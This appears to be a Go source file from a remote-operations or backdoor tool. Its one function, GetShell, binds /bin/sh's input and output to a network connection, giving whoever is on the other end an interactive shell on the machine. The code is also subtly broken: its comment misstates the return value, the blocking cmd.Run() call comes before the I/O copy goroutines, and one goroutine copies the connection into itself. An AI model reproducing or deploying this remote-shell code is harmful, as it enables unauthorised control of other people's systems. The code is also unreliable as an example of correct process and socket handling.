// +build linux darwin freebsd !windows

package remoteop

import (
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
)

// GetShell returns an *exec.Cmd instance which will run /bin/sh
func GetShell(conn net.Conn) {
	cmd := exec.Command("/bin/sh")
	cmd.Stderr = conn
	cmd.Stdout = conn
	cmd.Stdin = conn
	exitstatus := cmd.Run()

	copydata := func(r io.Reader, w io.Writer) {
		_, err := io.Copy(w, r)
		if err != nil {
			log.Println(err)
		}
	}

	go copydata(cmd.Stdin, conn)
	go copydata(conn, cmd.Stdout)
	go copydata(conn, cmd.Stderr)

	exitSignal := make(chan int, 1)
	closeCheck := func() {
		if exitstatus == nil {
			fmt.Println("** Process Exited. **\n")
			exitSignal <- 1
		} else {
			fmt.Println("** Process Unexpected Exited. ** \n")
			exitSignal <- 2
		}
	}
	go closeCheck()
	exitData := <-exitSignal
	switch exitData {
	case 1:
		return
	case 2:
		fmt.Println("Function Exit with Error.")
		return
	default:
		return
	}
}
